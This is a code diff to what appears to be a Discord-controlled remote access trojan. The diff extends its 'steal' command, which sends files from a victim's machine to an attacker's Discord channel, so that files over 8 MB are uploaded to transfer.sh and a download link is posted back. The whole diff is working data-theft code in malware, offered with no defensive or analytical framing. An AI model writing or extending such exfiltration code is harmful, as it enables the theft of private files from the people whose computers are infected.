@@ -183,10 +183,22 @@ while True:
         async def steal(ctx, sesion, *args):
             file_names = " ".join(args)
             if sesion == "all":
-                await ctx.send("stolen", file=discord.File(file_names))
+                size = os.path.getsize(file_names)
+                if size > 8000000:
+                    with open(file_names, 'rb') as file:
+                        out = requests.put(f"https://transfer.sh/{file_names}", data=file)
+                    await ctx.send(f"stolen {out.text}")
+                else:
+                    await ctx.send("stolen", file=discord.File(file_names))
             else:
                 if sesion == sesja:
-                    await ctx.send("stolen", file=discord.File(file_names))
+                    size = os.path.getsize(file_names)
+                    if size > 8000000:
+                        with open(file_names, 'rb') as file:
+                            out = requests.put(f"https://transfer.sh/{file_names}", data=file)
+                        await ctx.send(f"stolen {out.text}")
+                    else:
+                        await ctx.send("stolen", file=discord.File(file_names))
 
         @bot.command()
         async def info(ctx, sesion):
